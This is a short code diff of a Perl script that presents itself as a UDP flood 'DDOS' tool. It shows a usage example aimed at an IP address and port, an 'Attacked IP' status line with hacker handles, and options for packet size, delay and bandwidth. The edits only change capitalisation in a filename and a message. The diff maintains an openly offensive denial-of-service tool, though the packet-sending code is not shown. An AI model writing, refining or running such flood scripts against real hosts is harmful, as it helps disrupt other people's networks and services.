@@ -35,7 +35,7 @@ if ($help || !$ip) {
 \____/_____/_/DDOS  
                      
  EXAMPLE AS FOLLOWS :
- perl UDP.pl 192.168.0.1 80 65500
+ perl udp.pl 192.168.0.1 80 65500
 
 
 EOL
@@ -62,7 +62,7 @@ print "Attacked IP : $ip " . ($port ? $port : "By:") . " DarkAcidBurn " .
   ($size ? "$size-byte" : "UDP By: XxASxX") . " Erro 448" . ($time ? " for $time seconds" : "") . "\n";
 print "Interpacket delay $delay msec\n" if $delay;
 print "total IP bandwidth $bw kbps\n" if $bw;
-print "To Stop The Program Ctrl+C\n" unless $time;
+print "To stop the program Ctrl+C\n" unless $time;
 
 die "Invalid packet size requested: $size\n" if $size && ($size < 64 || $size > 1500);
 $size -= 28 if $size;
